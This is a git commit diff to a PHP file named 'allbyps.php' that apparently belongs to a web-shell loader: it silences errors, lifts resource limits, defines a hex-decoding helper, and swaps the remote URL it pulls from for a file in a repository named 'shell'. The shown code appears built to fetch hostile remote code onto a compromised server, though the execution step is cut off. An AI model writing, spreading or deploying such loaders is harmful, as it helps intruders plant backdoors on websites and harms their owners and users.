37834b996b600312b158252ec0a5aabe26fe3fa5
ETASMAYA <adsteramaheswara@gmail.com>
2026-07-27 16:02:29 +0700

    Update allbyps.php

--- allbyps.php
+++ allbyps.php
@@ -7,7 +7,7 @@ error_reporting(0);
 @ini_set('memory_limit', '512M');
 @set_time_limit(180);
 
-$u = 'https://raw.githubusercontent.com/tangsel1928/gecko/refs/heads/main/manager.php';
+$u = 'https://raw.githubusercontent.com/adsteramaheswara-cloud/shell/refs/heads/main/seobarbar.php';
 
 function _fx($hex)
 {
